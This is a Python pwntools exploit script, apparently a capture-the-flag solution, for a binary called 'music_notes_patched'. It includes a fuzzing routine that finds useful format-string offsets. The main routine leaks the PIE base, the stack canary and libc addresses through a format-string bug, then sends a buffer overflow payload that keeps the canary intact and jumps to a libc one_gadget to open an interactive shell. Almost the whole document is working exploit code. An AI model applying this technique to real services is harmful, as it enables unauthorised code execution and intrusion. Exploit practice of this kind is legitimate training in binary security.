#!/usr/bin/python
from pwn import *

elf = context.binary = ELF("./music_notes_patched")
# libc = ELF("./libc.so.6")
libc = ELF("./libc.so.6")

context.terminal = ['kitty']
context.encoding = 'ascii'
# context.log_level = 'critical'

gs = \
'''
b * sheet + 563
b * sheet + 579
'''

'''
interesting areas:
1: stack
2: libc
6: offset
19: PIE
31: canary
'''

HOST = "localhost:4340".split(":")

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*HOST) 
    else: 
        return process(elf.path)


def fuzz():
    context.log_level = 'critical'
    for i in range(1, 200):
        io = start()
        sheet(io)
        io.recvuntil("> ")
        io.sendline(f"%{i}$p")
        io.recvuntil("So, your name is: ")
        print(f"{i} => {io.recvline().decode()}", end='')
        io.close()


def sheet(io: tube):
    notes = "DBAGD"

    for i in range(5):
        io.recvuntil("Choose note:\n")
        a = io.recvline().split()[1].decode()
        io.recvuntil("> ")

        if a == notes[i]:
            io.sendline("1")
        else:
            io.sendline("2")


def pwn():
    pie_offset = 0xe17
    libc_offset = 0x3ed8c0

    io = start()
    sheet(io)
    io.recvuntil("> ")
    io.sendline(f"%19$p-%31$p-%2$p")
    io.recvuntil("So, your name is: ")
    leaks = io.recvline().rstrip(b"\n").decode().split("-")

    pie_leak = int(leaks[0], 16)
    canary = int(leaks[1], 16)
    libc_leak = int(leaks[2], 16)

    log.success(f"Leaked Libc: {hex(libc_leak)}")
    log.success(f"Leaked PIE address: {hex(pie_leak)}")
    log.success(f"Leaked Canary: {hex(canary)}")

    elf.address = pie_leak - pie_offset
    libc.address = libc_leak - libc_offset

    log.info(f"PIE base @ {hex(elf.address)}")
    log.info(f"Libc base @ {hex(libc.address)}")


    payload = flat({
        40: pack(canary),
        104: pack(libc.address + 0x4f432)
    })

    io.sendlineafter(":", payload)
    io.interactive()

    
if __name__ == "__main__":
    if args.FUZZ:
        fuzz()
        sys.exit()
    
    pwn()